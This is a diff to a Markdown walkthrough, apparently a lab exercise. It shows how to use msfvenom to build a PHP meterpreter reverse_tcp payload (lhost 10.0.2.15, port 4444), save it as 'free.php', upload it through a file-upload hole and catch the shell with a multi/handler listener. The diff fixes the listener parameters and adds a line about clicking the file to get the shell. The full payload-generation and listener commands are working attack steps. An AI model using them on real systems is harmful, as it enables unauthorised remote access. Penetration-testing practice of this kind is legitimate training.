@@ -24,7 +24,10 @@ $`Now we will try a different method in order to get to the system using MSFVeno
 
 Now that we know that we can upload a file, we will be using msfvenom in order to get a meterpreter session. We will open a new terminal and first search for a `reverse_tcp`. We will type in $`msfvenom --list payloads | grep php` the grep command will look for payloads which have php on it. When we find it we will type $`msfvenom --payload php/meterpreter/reverse_tcp lhost=10.0.2.15 lport=4444 > free.php` this is create a payload and save it as `free.php` We will need to upload this `free.php` to the uploads folder so that when somebody clicks on it, then it will connect back to our listener. 
 
-After this we will go back to the msfconsole, $`msf6 > use exploit/multi/handler`. Here we are setting up the listener. We want the user to connect back to me. After this we do options so as to see what parameters we need to set in order to use the exploit. We have to set the $`Rhost` and $`Rport` and we need to add the $`payload options` we will type in set payload options `php/meterpreter/reverse_tcp`. 
+After this we will go back to the msfconsole, $`msf6 > use exploit/multi/handler`. Here we are setting up the listener. We want the user to connect back to me. After this we do options so as to see what parameters we need to set in order to use the exploit. We have to set the $`Lhost` and $`Lport` and we need to add the $`payload options` we will type in set payload options `php/meterpreter/reverse_tcp`. Voila, once we go back to the browser and click on the new file that we just created, we should get the meterpreter shell. :-)
+
+
+![shell](https://user-images.githubusercontent.com/93686063/202188651-55649925-88ba-49df-bd97-b36750468c41.JPG)
 
 
 
